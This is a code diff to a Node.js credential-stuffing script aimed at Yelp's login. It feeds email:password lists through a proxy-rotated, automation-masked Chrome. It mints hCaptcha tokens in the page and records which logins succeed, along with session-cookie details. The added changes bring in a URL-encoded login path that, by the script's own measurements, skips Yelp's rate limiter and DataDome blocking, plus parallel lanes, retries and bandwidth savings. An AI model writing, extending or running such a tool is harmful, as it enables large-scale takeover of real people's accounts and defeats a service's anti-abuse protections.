@@ -1,40 +1,64 @@
-﻿const http = require('http');
+const http = require('http');
 const net = require('net');
 const fs = require('fs');
 const { spawn } = require('child_process');
 const os = require('os');
 const path = require('path');
 
-// Fast path: one hydrated page, hCaptcha token minted in-page, POST /login/newajax via fetch.
-// Two hard limits drive the pacing:
-//   1) ~15 POST / 60 s per IP  -> 429 above that
-//   2) ~30 POST per sticky IP  -> 403 (DataDome) from POST 32 onwards
-// So: 15 POST per IP, rotate by relaunching Chrome. 15 also sits under the 429 window,
-// which means no pacing sleep is needed inside a chunk.
+// Fast path: hydrated page(s), hCaptcha token minted in-page, POST to the encoded login
+// endpoint via fetch.
+// Hard limits measured on one sticky IP:
+//   1) 15 POST / 60 s on /login/newajax (also /login) -> 429 "routing service".
+//   2) ~32 POST per sticky IP on the normal path     -> 403 (DataDome).
 //
-// env: BID LIST OUT PU_BASE PW [MAXT] [SITEKEY] [PACE] [BUDGET]
+// URL-encoding any character of the path skips the routing-service limiter: the edge
+// matches the raw string, the app still decodes and routes to the same handler. 71
+// consecutive encoded POSTs on one IP: 0 x 429, 0 x 403 (vs 15 then 429 on the normal
+// path); 0-11% land on the magic-link handler instead (retried). A 250-POST runner run
+// on one IP produced 249 verdicts, 0 unknown, 0 x 429/403.
+// POST_PATH can be set back to /login/newajax to use the plain path.
+//
+// env: BID LIST OUT PU_BASE PW [POST_PATH] [LANES] [LANE_PACE] [MAXT] [SITEKEY] [PACE]
+//      [BUDGET] [RELOAD_EVERY] [NO_MEDIA] [BLOCK_URLS] [CACHE_MB] [CACHE_DIR]
 const BID = parseInt(process.env.BID || '0', 10);
 const LIST = process.env.LIST, OUT = process.env.OUT;
 const PU_BASE = process.env.PU_BASE, PW = process.env.PW;
-const MAXT = parseInt(process.env.MAXT || '900000', 10);
+const MAXT = parseInt(process.env.MAXT || '1200000', 10);
 const SITEKEY = process.env.SITEKEY || '6660d4df-1884-4ac6-a933-e5f3bd460946';
-const PACE = parseInt(process.env.PACE || '14', 10);      // max POST per rolling minute
-const BUDGET = parseInt(process.env.BUDGET || '15', 10);  // max POST per sticky IP
+const HOSTS = (process.env.LANES || 'www.yelp.com').split(',').map(s => s.trim()).filter(Boolean);
+const POST_PATH = process.env.POST_PATH || '/login/%6E%65%77%61%6A%61%78';
+const LANE_PACE = parseInt(process.env.LANE_PACE || '0', 10);  // 0 = no per-lane cap
+const PACE = parseInt(process.env.PACE || '0', 10);            // 0 = no global pacing
+const BUDGET = parseInt(process.env.BUDGET || '250', 10);      // POSTs per sticky IP (250 measured clean)
+const RELOAD_EVERY = parseInt(process.env.RELOAD_EVERY || '100', 10); // rehydrate page every N POSTs; 0 = off
+
+// --- bandwidth knobs -------------------------------------------------------
+// Every byte Chrome pulls is paid for by the metered proxy. The login page ships
+// images, fonts, media and analytics that the captcha flow never touches, so drop
+// them before they reach the relay. Set NO_MEDIA=0 / BLOCK_URLS=0 to disable.
+const NO_MEDIA = process.env.NO_MEDIA !== '0';
+const BLOCK_URLS = process.env.BLOCK_URLS === '0' ? [] : require('./bw-blocklist');
+// A cache that outlives the chunk: the next chunk re-uses the already-paid login
+// assets instead of pulling them through a fresh proxy session.
+const CACHE_MB = parseInt(process.env.CACHE_MB || '64', 10);
+
 
 const PH = process.env.PROXY_HOST || 'pr.oxylabs.io';
 const PP = parseInt(process.env.PROXY_PORT || '7777', 10);
-const SESS = ('f' + BID) + 'z' + Math.floor(Math.random() * 100000);
-const PU = PU_BASE + '-sessid-' + SESS + (process.env.PU_SUFFIX || '-sesstime-1800');
+const SESS = process.env.SESSID || ('f' + BID) + 'z' + Math.floor(Math.random() * 100000);
+const PU = process.env.PU || (PU_BASE + '-sessid-' + SESS + (process.env.PU_SUFFIX || '-sesstime-1800'));
 const AUTH = 'Basic ' + Buffer.from(PU + ':' + PW).toString('base64');
 const LP = 8986 + BID, CP = 9306 + BID;
 
 const relay = http.createServer((q, s) => {
+  s.on('error', () => {}); q.on('error', () => {});
   try {
     const u = new URL(q.url);
     const pr = http.request({ host: u.hostname, port: u.port || 80, method: q.method, path: u.pathname + u.search, headers: Object.assign({}, q.headers, { host: u.host }) }, r => { s.writeHead(r.statusCode, r.headers); r.pipe(s); });
     pr.on('error', () => s.destroy()); q.pipe(pr);
   } catch (e) { s.destroy(); }
 });
+relay.on('clientError', (e, s) => { try { s.destroy(); } catch (_) {} });
 relay.on('connect', (req, cs, head) => {
   const sock = net.connect(PP, PH, () => sock.write('CONNECT ' + req.url + ' HTTP/1.1\r\nHost: ' + req.url + '\r\nProxy-Authorization: ' + AUTH + '\r\n\r\n'));
   let buf = Buffer.alloc(0);
@@ -58,6 +82,10 @@ relay.on('connect', (req, cs, head) => {
 const sleep = ms => new Promise(r => setTimeout(r, ms));
 async function j(u, n) { for (let i = 0; i < n; i++) { try { const r = await fetch(u); return await r.json(); } catch (e) { await sleep(400); } } return null; }
 const rec = o => { fs.appendFileSync(OUT, JSON.stringify(o) + '\n'); console.log(JSON.stringify(o)); };
+// A dropped proxy socket must not kill the chunk silently: record it, let run-all requeue.
+let finished = false;
+process.on('uncaughtException', e => { if (finished) process.exit(0); try { rec({ event: 'abort', why: 'crash', err: String(e && e.message || e) }); } catch (_) {} process.exit(3); });
+process.on('unhandledRejection', e => { try { rec({ event: 'abort', why: 'crash', err: String(e && e.message || e) }); } catch (_) {} process.exit(3); });
 const t0 = Date.now();
 // Disk guard: a full temp volume makes Chrome silently stall (ENOSPC), which looks like
 // DataDome/hydration failure and destroys throughput. 2 GB is the floor.
@@ -70,86 +98,149 @@ const t0 = Date.now();
 })();
 const postTimes = [];   // ms timestamps of every POST sent from this IP
 let paceSleepMs = 0;
+// The encoded path has no rate window; if Yelp fixes it and we fall back to the canonical
+// path, drop to the measured-safe 14/min and 30 rows without restarting the chunk.
+let paceRate = PACE;
+let budget = BUDGET;
 
 function paceDelay() {
+  if (paceRate <= 0) return 0;
   const now = Date.now();
   while (postTimes.length && postTimes[0] < now - 60000) postTimes.shift();
-  if (postTimes.length >= PACE) {
+  if (postTimes.length >= paceRate) {
     const wait = postTimes[0] + 60000 - now + 250;
     return wait > 0 ? wait : 0;
   }
   return 0;
 }
 
+// One lane per host: extra tabs in the same browser share the proxy IP and its POST
+// budget, so lanes add parallelism, not budget. Each lane has its own csrf token and
+// hCaptcha widget; POST stays same-origin so there is no CORS involved.
+const lanes = HOSTS.map((host, idx) => ({
+  idx, host, base: 'https://' + host, sid: null,
+  csrf: '', ready: false, dead: false, pausedUntil: 0,
+  posted: 0, r429: 0, tokFail: 0, tokStreak: 0, times: []
+}));
+
 (async () => {
   fs.writeFileSync(OUT, '');
   const creds = fs.readFileSync(LIST, 'utf8').split(/\r?\n/).map(l => l.trim()).filter(Boolean).map(l => {
     const c = l.indexOf(':'); return { email: l.slice(0, c), pass: l.slice(c + 1) };
   });
-  rec({ event: 'start', n: creds.length, sess: SESS, mode: 'fast', pace: PACE, budget: BUDGET });
+  rec({ event: 'start', n: creds.length, sess: SESS, mode: 'fast', pace: PACE, lanePace: LANE_PACE, budget: BUDGET, lanes: HOSTS, path: POST_PATH });
 
   await new Promise(r => relay.listen(LP, '127.0.0.1', r));
   const udd = path.join(os.tmpdir(), 'cdp-f' + BID + '-' + Date.now());
+  // Persistent per-worker cache (kept between chunks); the profile itself stays throwaway.
+  const CDD = path.join(process.env.CACHE_DIR || path.join(os.tmpdir(), 'yelp-cache'), 'f' + BID);
+  try { fs.mkdirSync(CDD, { recursive: true }); } catch (e) {}
+  rec({ event: 'bw', noMedia: NO_MEDIA, blockUrls: BLOCK_URLS.length, cacheMB: CACHE_MB });
   const chrome = spawn(process.env.CHROME || 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe', [
     '--no-first-run', '--no-default-browser-check', '--disable-blink-features=AutomationControlled',
     '--window-size=900,700', '--lang=en-US', '--user-data-dir=' + udd,
     // Throttled timers on a backgrounded window freeze the hCaptcha poll, so mint()
     // only returns via the 40 s CDP timeout with an empty token (see PITFALLS 27).
     '--disable-background-timer-throttling', '--disable-backgrounding-occluded-windows',
-    '--disable-renderer-backgrounding', '--disable-features=CalculateNativeWinOcclusion,IntensiveWakeUpThrottling',
+    '--disable-renderer-backgrounding',
+    '--disable-features=CalculateNativeWinOcclusion,IntensiveWakeUpThrottling,Prerender2,SpeculationRulesPrefetch',
+    // Bandwidth: no images, no webfonts, capped persistent disk cache.
+    ...(NO_MEDIA ? ['--blink-settings=imagesEnabled=false', '--disable-remote-fonts'] : []),
+    ...(CACHE_MB > 0 ? ['--disk-cache-dir=' + CDD, '--disk-cache-size=' + (CACHE_MB * 1024 * 1024), '--media-cache-size=1'] : []),
     '--proxy-server=http://127.0.0.1:' + LP, '--remote-debugging-port=' + CP,
-    'https://www.yelp.com/login/'
+    'about:blank'
   ], { stdio: 'ignore' });
 
   const ver = await j('http://127.0.0.1:' + CP + '/json/version', 40);
   if (!ver) { rec({ err: 'cdp' }); chrome.kill(); relay.close(); return; }
   const ws = new WebSocket(ver.webSocketDebuggerUrl);
-  let id = 0; const pend = new Map();
-  ws.addEventListener('message', ev => { let m; try { m = JSON.parse(ev.data); } catch (e) { return; } if (m.id && pend.has(m.id)) { pend.get(m.id)(m); pend.delete(m.id); } });
+  ws.addEventListener('error', () => {});
+  let id = 0, bytes = 0; const pend = new Map();
+  ws.addEventListener('message', ev => {
+    let m; try { m = JSON.parse(ev.data); } catch (e) { return; }
+    // Blocked heavy resources are failed locally: zero bytes reach the proxy.
+    if (m.method === 'Fetch.requestPaused') {
+      ws.send(JSON.stringify({ id: ++id, method: 'Fetch.failRequest', params: { requestId: m.params.requestId, errorReason: 'BlockedByClient' }, sessionId: m.sessionId }));
+      return;
+    }
+    // Metered bytes actually pulled over the proxy, for the summary.
+    if (m.method === 'Network.loadingFinished' && m.params && m.params.encodedDataLength) bytes += m.params.encodedDataLength;
+    if (m.id && pend.has(m.id)) { pend.get(m.id)(m); pend.delete(m.id); }
+  });
   await new Promise((res, rej) => { ws.addEventListener('open', res); ws.addEventListener('error', rej); });
   const send = (mth, p) => new Promise(resolve => { const mid = ++id; pend.set(mid, resolve); ws.send(JSON.stringify({ id: mid, method: mth, params: p || {} })); });
-  const sendS = (mth, p) => new Promise(resolve => { const mid = ++id; pend.set(mid, resolve); ws.send(JSON.stringify({ id: mid, method: mth, params: p || {}, sessionId: sid })); });
-
-  await sleep(8000);
-  const t = await send('Target.getTargets');
-  let sid = null;
-  if (t && t.result) { const pg = t.result.targetInfos.find(x => x.type === 'page'); if (pg) { const a = await send('Target.attachToTarget', { targetId: pg.targetId, flatten: true }); if (a && a.result) sid = a.result.sessionId; } }
-  const ev = e => new Promise(resolve => {
+  const sendS = (lane, mth, p) => new Promise(resolve => { const mid = ++id; pend.set(mid, resolve); ws.send(JSON.stringify({ id: mid, method: mth, params: p || {}, sessionId: lane.sid })); });
+  const ev = (lane, e) => new Promise(resolve => {
     const mid = Math.floor(Math.random() * 1e9);
     const h = x => { try { const m = JSON.parse(x.data); if (m.id === mid) { ws.removeEventListener('message', h); resolve(m.result && m.result.result ? m.result.result.value : null); } } catch (err) {} };
     ws.addEventListener('message', h);
-    ws.send(JSON.stringify({ id: mid, method: 'Runtime.evaluate', params: { expression: e, returnByValue: true, awaitPromise: true }, sessionId: sid }));
+    ws.send(JSON.stringify({ id: mid, method: 'Runtime.evaluate', params: { expression: e, returnByValue: true, awaitPromise: true }, sessionId: lane.sid }));
     setTimeout(() => resolve(null), 40000);
   });
-  await sendS('Page.enable'); await sendS('Network.enable', {});
-  // Keep the tab focused so Chrome does not throttle its timers.
-  await sendS('Emulation.setFocusEmulationEnabled', { enabled: true });
-  await sendS('Page.bringToFront', {});
 
-  let ddok = false;
-  for (let k = 0; k < 25; k++) {
-    await sleep(2000);
-    const s = await ev(`JSON.stringify({l:document.documentElement.outerHTML.length,t:document.title})`);
-    try { const o = JSON.parse(s); if (o && o.l > 200000 && /Log In/i.test(o.t || '')) { ddok = true; break; } } catch (e) {}
+  // Attach as soon as the first page target exists instead of paying a fixed 8 s sleep.
+  for (let k = 0; k < 60 && !lanes[0].sid; k++) {
+    await sleep(250);
+    const t = await send('Target.getTargets');
+    if (t && t.result) {
+      const pg = t.result.targetInfos.find(x => x.type === 'page');
+      if (pg) { const a = await send('Target.attachToTarget', { targetId: pg.targetId, flatten: true }); if (a && a.result) lanes[0].sid = a.result.sessionId; }
+    }
   }
-  rec({ event: 'ddok', ddok });
-  if (!ddok) { rec({ event: 'abort', why: 'dd' }); chrome.kill(); relay.close(); return; }
+  if (!lanes[0].sid) { rec({ event: 'abort', why: 'cdp' }); chrome.kill(); relay.close(); return; }
 
-  async function hydrate(rounds) {
+  // Extra lanes: one new tab each (same browser, same proxy session = same egress IP,
+  // shared disk cache).
+  for (let k = 1; k < lanes.length; k++) {
+    const c = await send('Target.createTarget', { url: 'about:blank' });
+    if (c && c.result && c.result.targetId) {
+      const a = await send('Target.attachToTarget', { targetId: c.result.targetId, flatten: true });
+      if (a && a.result) lanes[k].sid = a.result.sessionId;
+    }
+    if (!lanes[k].sid) { rec({ event: 'lane_dead', host: lanes[k].host, why: 'tab' }); lanes[k].dead = true; }
+  }
+
+  // Per-tab setup: network events, focus, and the bandwidth filters.
+  for (const lane of lanes) {
+    if (!lane.sid) continue;
+    await sendS(lane, 'Page.enable'); await sendS(lane, 'Network.enable', {});
+    await sendS(lane, 'Emulation.setFocusEmulationEnabled', { enabled: true });
+    await sendS(lane, 'Page.bringToFront', {});
+    if (NO_MEDIA) {
+      try {
+        await sendS(lane, 'Fetch.enable', { patterns: [
+          { urlPattern: '*', resourceType: 'Image', requestStage: 'Request' },
+          { urlPattern: '*', resourceType: 'Media', requestStage: 'Request' },
+          { urlPattern: '*', resourceType: 'Font', requestStage: 'Request' }
+        ] });
+      } catch (e) { rec({ event: 'bw_warn', what: 'fetch', lane: lane.host, err: String(e && e.message || e) }); }
+    }
+    if (BLOCK_URLS.length) {
+      try { await sendS(lane, 'Network.setBlockedURLs', { urls: BLOCK_URLS }); }
+      catch (e) { rec({ event: 'bw_warn', what: 'blockurls', lane: lane.host, err: String(e && e.message || e) }); }
+    }
+  }
+
+  // keepFirst: the page is usually already hydrated right after the ddok probe, so the
+  // first round checks it in place instead of paying for another full page load.
+  async function hydrate(lane, rounds, keepFirst) {
     for (let a = 0; a < rounds; a++) {
-      await sendS('Page.navigate', { url: 'https://www.yelp.com/login/' });
-      for (let k = 0; k < 20; k++) {
+      const keep = a === 0 && keepFirst;
+      if (!keep) await sendS(lane, 'Page.navigate', { url: lane.base + '/login/' });
+      // A kept page gets a short probe only: if it is not ready, reload instead of waiting.
+      for (let k = 0; k < (keep ? 2 : 20); k++) {
         await sleep(1000);
-        const s = await ev(`JSON.stringify({f:!!document.getElementById('ajax-login'),h:!!window.hcaptcha,l:document.documentElement.outerHTML.length})`);
+        const s = await ev(lane, `JSON.stringify({f:!!document.getElementById('ajax-login'),h:!!window.hcaptcha,l:document.documentElement.outerHTML.length})`);
         try { const o = JSON.parse(s); if (o && o.f && o.h && o.l > 400000) return true; } catch (e) {}
       }
     }
     return false;
   }
-  async function armWidget() {
-    // A self-rendered widget is fine: same sitekey, token is accepted as long as the
-    // field name is hcaptcha_response (underscore). h-captcha-response is ignored.
-    return await ev(`(function(){
+  async function armWidget(lane) {
+    // Prefer the page's own widget: a self-rendered widget has no site rqdata and its
+    // token is rejected server-side (PITFALLS 25). The field must be hcaptcha_response
+    // (underscore); h-captcha-response is ignored.
+    return await ev(lane, `(function(){
       if(window.__fcReady) return 'ready:'+window.__wid;
       if(!window.hcaptcha) return 'no-api';
       var c=document.querySelector('[data-hcaptcha-widget-id]');
@@ -165,7 +256,11 @@ function paceDelay() {
       return 'own:'+window.__wid;
     })()`);
   }
-  const mint = () => ev(`new Promise(function(res){
+  const mint = async lane => {
+    // A background tab gets its hCaptcha timers throttled even with the flags above;
+    // focus the tab first so the token comes back in ~1 s instead of 6-10 s.
+    try { await sendS(lane, 'Page.bringToFront', {}); } catch (e) {}
+    return ev(lane, `new Promise(function(res){
     var w=window.__wid;
     if(!w){ res(''); return; }
     var done=false;
@@ -186,59 +281,122 @@ function paceDelay() {
       else if(n>60){ clearInterval(iv); fin(''); }
     },200);
   })`);
+  };
+  const csrfOf = lane => ev(lane, `(function(){var i=document.querySelector('#ajax-login input[name=csrftok]');return i?i.value:'';})()`);
 
-  let ok = await hydrate(4);
-  rec({ event: 'hydrated', ok });
-  if (!ok) { rec({ event: 'abort', why: 'hydrate' }); chrome.kill(); relay.close(); return; }
+  // Lane 0 gets the DataDome probe: a 403/captcha page is detected before spending tokens.
+  await sendS(lanes[0], 'Page.navigate', { url: lanes[0].base + '/login/' });
+  let ddok = false;
+  for (let k = 0; k < 34; k++) {
+    await sleep(1500);
+    const s = await ev(lanes[0], `JSON.stringify({l:document.documentElement.outerHTML.length,t:document.title})`);
+    try { const o = JSON.parse(s); if (o && o.l > 200000 && /Log In/i.test(o.t || '')) { ddok = true; break; } } catch (e) {}
+  }
+  rec({ event: 'ddok', ddok });
+  if (!ddok) { rec({ event: 'abort', why: 'dd' }); chrome.kill(); relay.close(); return; }
 
-  const armed = await armWidget();
-  rec({ event: 'widget', armed });
-  if (String(armed).startsWith('err') || armed === 'no-api') { rec({ event: 'abort', why: 'widget' }); chrome.kill(); relay.close(); return; }
+  lanes[0].ready = await hydrate(lanes[0], 4, true);
+  rec({ event: 'hydrated', lane: lanes[0].host, ok: lanes[0].ready });
+  if (!lanes[0].ready) { rec({ event: 'abort', why: 'hydrate' }); chrome.kill(); relay.close(); return; }
 
-  let csrf = await ev(`(function(){var i=document.querySelector('#ajax-login input[name=csrftok]');return i?i.value:'';})()`);
-  rec({ event: 'csrf', len: (csrf || '').length });
+  // Other lanes hydrate in parallel with lane 0 finishing: start navigations now.
+  await Promise.all(lanes.slice(1).filter(l => l.sid).map(async lane => {
+    lane.ready = await hydrate(lane, 3, false);
+    rec({ event: 'hydrated', lane: lane.host, ok: lane.ready });
+    if (!lane.ready) { lane.dead = true; rec({ event: 'lane_dead', host: lane.host, why: 'hydrate' }); }
+  }));
+
+  for (const lane of lanes) {
+    if (!lane.ready) continue;
+    const armed = await armWidget(lane);
+    lane.armed = armed;
+    rec({ event: 'widget', lane: lane.host, armed });
+    if (String(armed).startsWith('err') || armed === 'no-api') { lane.dead = true; rec({ event: 'lane_dead', host: lane.host, why: 'widget' }); continue; }
+    lane.csrf = await csrfOf(lane);
+    rec({ event: 'csrf', lane: lane.host, len: (lane.csrf || '').length });
+  }
+  if (!lanes.some(l => l.ready && !l.dead)) { rec({ event: 'abort', why: 'lanes' }); chrome.kill(); relay.close(); return; }
+
+  // --- pacing across lanes -------------------------------------------------
+  function laneCount(lane) {
+    const now = Date.now();
+    while (lane.times.length && lane.times[0] < now - 60000) lane.times.shift();
+    return lane.times.length;
+  }
+  function pickLane() {
+    const now = Date.now();
+    const pool = lanes.filter(l => l.ready && !l.dead && now >= l.pausedUntil && (LANE_PACE <= 0 || laneCount(l) < LANE_PACE));
+    if (!pool.length) return null;
+    pool.sort((a, b) => laneCount(a) - laneCount(b) || a.posted - b.posted);
+    return pool[0];
+  }
+  function laneWait() {
+    const now = Date.now();
+    let w = Infinity;
+    for (const l of lanes) {
+      if (!l.ready || l.dead) continue;
+      if (now < l.pausedUntil) { w = Math.min(w, l.pausedUntil - now); continue; }
+      if (LANE_PACE <= 0) { w = 0; continue; }
+      const c = laneCount(l);
+      if (c >= LANE_PACE) w = Math.min(w, l.times[0] + 60300 - now);
+      else w = 0;
+    }
+    return w === Infinity ? 0 : Math.max(0, w);
+  }
 
   let validated = 0, success = 0, unable = 0, link = 0, closed = 0, unknown = 0, r429 = 0, r403 = 0, r407 = 0, tokFail = 0, posted = 0;
   const successes = [], msAll = [], tokAll = [], postAll = [];
   let blocked = false;
-  let tokStreak = 0;   // consecutive empty-token mints; 2 means the widget is dead
+  let postPath = POST_PATH;
+  let sinceReload = 0, reloads = 0, unresolved = 0;
 
   for (let i = 0; i < creds.length && !blocked; i++) {
     if (Date.now() - t0 > MAXT) { rec({ event: 'timecap', at: i }); break; }
-    if (posted >= BUDGET) { rec({ event: 'budget', at: i, posted }); break; }
+    if (posted >= budget) { rec({ event: 'budget', at: i, posted }); break; }
     const c = creds[i];
     let fin = false;
+    let noiseReloaded = false;
 
-    for (let att = 0; att < 3 && !fin && !blocked; att++) {
+    for (let att = 0; att < 5 && !fin && !blocked; att++) {
+      let lane = pickLane();
+      if (!lane) {
+        const w = laneWait();
+        if (w > 0) { paceSleepMs += w; await sleep(w); }
+        lane = pickLane();
+      }
+      if (!lane) { rec({ event: 'abort', why: 'lanes', at: i + 1, posted }); blocked = true; break; }
+
       const wait = paceDelay();
       if (wait > 0) { paceSleepMs += wait; await sleep(wait); }
 
       const tt = Date.now();
-      const tok = await mint();
+      const tok = await mint(lane);
       const tokMs = Date.now() - tt;
       // An empty hcaptcha_response makes Yelp answer "We're unable to log you in right
       // now." for every credential, so never spend a POST on it. Two in a row means the
-      // widget/IP is dead: abort the chunk and rotate instead of burning the budget.
+      // widget is dead: retry on another lane instead of burning the budget.
       if (!tok) {
-        tokFail++; tokStreak++;
-        rec({ event: 'tokfail', at: i + 1, tokMs, streak: tokStreak });
-        if (tokStreak >= 2) { rec({ event: 'abort', why: 'captcha', at: i + 1, tokMs }); blocked = true; break; }
-        await sleep(1500);
+        tokFail++; lane.tokFail++; lane.tokStreak++;
+        rec({ event: 'tokfail', at: i + 1, lane: lane.host, tokMs, streak: lane.tokStreak });
+        if (lane.tokStreak >= 2) { lane.dead = true; rec({ event: 'lane_dead', host: lane.host, why: 'captcha' }); }
+        if (!lanes.some(l => l.ready && !l.dead)) { rec({ event: 'abort', why: 'captcha', at: i + 1, tokMs }); blocked = true; break; }
+        await sleep(800);
         continue;
       }
-      tokStreak = 0;
+      lane.tokStreak = 0;
 
       const tp = Date.now();
+      lane.times.push(Date.now());
       postTimes.push(Date.now());
-      posted++;
-      const raw = await ev(`(async function(){
+      posted++; lane.posted++; sinceReload++;
+      const raw = await ev(lane, `(async function(){
         var b=new URLSearchParams();
-        b.set('csrftok', ${JSON.stringify(csrf)});
+        b.set('csrftok', ${JSON.stringify(lane.csrf)});
         b.set('email', ${JSON.stringify(c.email)});
         b.set('password', ${JSON.stringify(c.pass)});
         b.set('hcaptcha_response', ${JSON.stringify(String(tok || ''))});
         try {
-          var r=await fetch('/login/newajax',{method:'POST',credentials:'include',
+          var r=await fetch(${JSON.stringify(postPath)},{method:'POST',credentials:'include',
             headers:{'Content-Type':'application/x-www-form-urlencoded','X-Requested-With':'XMLHttpRequest'},
             body:b.toString()});
           return JSON.stringify({status:r.status, body:(await r.text()).slice(0,600)});
@@ -250,10 +408,22 @@ function paceDelay() {
       let r = {}; try { r = JSON.parse(raw || '{}'); } catch (e) {}
       let js = null; try { js = JSON.parse(r.body || 'null'); } catch (e) {}
 
-      if (r.status === 429) { r429++; rec({ event: 'r429', at: i + 1, posted }); await sleep(13000); continue; }
+      if (r.status === 429) {
+        r429++; lane.r429++;
+        lane.pausedUntil = Math.max(Date.now() + 5000, (lane.times[0] || Date.now()) + 60500);
+        rec({ event: 'r429', at: i + 1, posted, lane: lane.host, path: postPath, pauseMs: lane.pausedUntil - Date.now() });
+        continue;
+      }
+      // Yelp fixes routing bugs eventually: fall back to the canonical path instead of
+      // burning the whole chunk on 404s.
+      if (r.status === 404 && postPath !== '/login/newajax') {
+        rec({ event: 'path_fallback', at: i + 1, from: postPath });
+        postPath = '/login/newajax'; paceRate = 14; budget = 30;
+        continue;
+      }
       if (r.status === 403 || r.status === 407) {
         if (r.status === 403) r403++; else r407++;
-        rec({ event: r.status === 403 ? 'r403' : 'r407', at: i + 1, posted, body: (r.body || '').slice(0, 60) });
+        rec({ event: r.status === 403 ? 'r403' : 'r407', at: i + 1, posted, lane: lane.host, body: (r.body || '').slice(0, 60) });
         blocked = true;
         break;
       }
@@ -263,7 +433,38 @@ function paceDelay() {
       const isClosed = /has been closed/i.test(text);
       const isInvalid = !!(js && js.error_fields && js.error_fields.indexOf('password') >= 0 && /incorrect/i.test(text));
       const isUnable = /unable to log you in/i.test(text);
-      const isLink = !!(js && (js.require_link || js.magic_link) && !isSuccess) || /login link|magic link/i.test(text);
+      // Encoded paths sometimes land on the magic-link handler (same routing quirk that
+      // skips the limiter). That is routing noise, not a verdict. Two in a row means the
+      // page/csrf is stale: reload once, then retry; if it still happens, leave the row
+      // unwritten so run-all requeues it instead of recording an `unknown` verdict.
+      const isMagicNoise = /sending a (login|magic) link/i.test(text);
+      if (isMagicNoise) {
+        if (att < 2) {
+          rec({ event: 'retry_route', at: i + 1, lane: lane.host, path: postPath });
+          await sleep(300);
+          continue;
+        }
+        if (!noiseReloaded) {
+          noiseReloaded = true;
+          rec({ event: 'reload_noise', at: i + 1, lane: lane.host });
+          const h = await hydrate(lane, 3, false);
+          if (h) { lane.csrf = await csrfOf(lane); await armWidget(lane); sinceReload = 0; reloads++; continue; }
+          lane.dead = true;
+        }
+        unresolved++;
+        rec({ event: 'row_unresolved', at: i + 1, email: c.email, why: 'route' });
+        fin = true;
+        break;
+      }
+      const isLink = !!(js && (js.require_link || js.magic_link) && !isSuccess) || (/login link|magic link/i.test(text) && !isMagicNoise);
+
+      // A token-less request is never posted (guard above), so `unable` here means the
+      // server refused a real token. Retry once before spending a verdict slot.
+      if (isUnable && att < 2) {
+        rec({ event: 'retry_unable', at: i + 1, lane: lane.host, tokLen: String(tok).length });
+        await sleep(800);
+        continue;
+      }
 
       if (isSuccess) success++; else if (isClosed) closed++; else if (isInvalid) validated++;
       else if (isUnable) unable++; else if (isLink) link++; else unknown++;
@@ -271,31 +472,49 @@ function paceDelay() {
       let profileStatus = null, zss = null;
       if (isSuccess) {
         await sleep(2000);
-        profileStatus = await ev(`(async()=>{ try { const r=await fetch('/profile',{credentials:'include'}); return r.status; } catch(e){ return -1; } })()`);
-        const ck = await sendS('Network.getAllCookies', {});
+        profileStatus = await ev(lane, `(async()=>{ try { const r=await fetch('/profile',{credentials:'include'}); return r.status; } catch(e){ return -1; } })()`);
+        const ck = await sendS(lane, 'Network.getAllCookies', {});
         const all = (ck && ck.result && ck.result.cookies) || [];
         zss = all.filter(x => x.name === 'zss').map(x => ({ d: x.domain, len: (x.value || '').length }));
-        successes.push({ email: c.email, pass: c.pass, profileStatus, zss });
+        successes.push({ email: c.email, pass: c.pass, lane: lane.host, profileStatus, zss });
       }
       const zssLen = zss && zss.length ? Math.max(...zss.map(x => x.len)) : 0;
-      rec({ i: i + 1, email: c.email, pass: c.pass, status: r.status, success: isSuccess, validated: isInvalid, unable: isUnable, link: isLink, closed: isClosed, tokLen: String(tok || '').length, tokMs, postMs, body: (r.body || '').slice(0, 110), profileStatus, zss: zss ? zss.length : 0, zssLen, ms: tokMs + postMs });
+      rec({ i: i + 1, email: c.email, pass: c.pass, lane: lane.host, status: r.status, success: isSuccess, validated: isInvalid, unable: isUnable, link: isLink, closed: isClosed, tokLen: String(tok || '').length, tokMs, postMs, body: (r.body || '').slice(0, 110), profileStatus, zss: zss ? zss.length : 0, zssLen, ms: tokMs + postMs });
       fin = true;
 
       if (isSuccess) {
-        await sendS('Page.navigate', { url: 'https://www.yelp.com/logout?return_url=%2Flogin%2F' });
+        try { await sendS(lane, 'Page.bringToFront', {}); } catch (e) {}
+        await sendS(lane, 'Page.navigate', { url: lane.base + '/logout?return_url=%2Flogin%2F' });
         await sleep(4000);
-        const h = await hydrate(3);
-        if (!h) { rec({ event: 'rehydrate_fail', at: i + 1 }); blocked = true; break; }
-        csrf = await ev(`(function(){var i=document.querySelector('#ajax-login input[name=csrftok]');return i?i.value:'';})()`);
-        await armWidget();
+        let h = await hydrate(lane, 4, false);
+        if (!h) { h = await hydrate(lane, 4, false); }
+        if (!h) { rec({ event: 'rehydrate_fail', at: i + 1, lane: lane.host }); lane.dead = true; continue; }
+        lane.csrf = await csrfOf(lane);
+        await armWidget(lane);
+        sinceReload = 0;
+      }
+
+      // Long chunks degrade after ~150 POSTs: the csrf/page gets stale and the encoded
+      // path starts landing on the magic-link handler. Reload while the page is cheap
+      // (warm cache) instead of paying retries at the tail.
+      if (RELOAD_EVERY > 0 && sinceReload >= RELOAD_EVERY) {
+        rec({ event: 'reload_sched', at: i + 1, since: sinceReload });
+        const h = await hydrate(lane, 3, false);
+        if (!h) { rec({ event: 'rehydrate_fail', at: i + 1, lane: lane.host }); lane.dead = true; continue; }
+        lane.csrf = await csrfOf(lane);
+        await armWidget(lane);
+        sinceReload = 0; reloads++;
       }
     }
   }
 
   const avg = a => a.length ? Math.round(a.reduce((x, y) => x + y, 0) / a.length) : 0;
+  finished = true;
   rec({ event: 'summary', mode: 'fast', processed: msAll.length, posted, validated, success, unable, link, closed, unknown,
         r429, r403, r407, tokFail, blocked, paceSleepMs, avgTokMs: avg(tokAll), avgPostMs: avg(postAll), avgMs: avg(msAll),
-        secs: Math.round((Date.now() - t0) / 1000), successes });
+        bytes, mb: Math.round(bytes / 1048576 * 10) / 10, bytesPerPost: posted ? Math.round(bytes / posted) : 0,
+        secs: Math.round((Date.now() - t0) / 1000), successes, path: postPath, paceRate, budget, reloads, unresolved,
+        lanes: lanes.map(l => ({ host: l.host, ready: l.ready, dead: l.dead, posted: l.posted, r429: l.r429, tokFail: l.tokFail })) });
 
   try { ws.close(); } catch (e) {}
   try { chrome.kill(); } catch (e) {}
@@ -303,5 +522,3 @@ function paceDelay() {
   try { relay.close(); } catch (e) {}
   setTimeout(() => process.exit(0), 800);
 })();
-
-
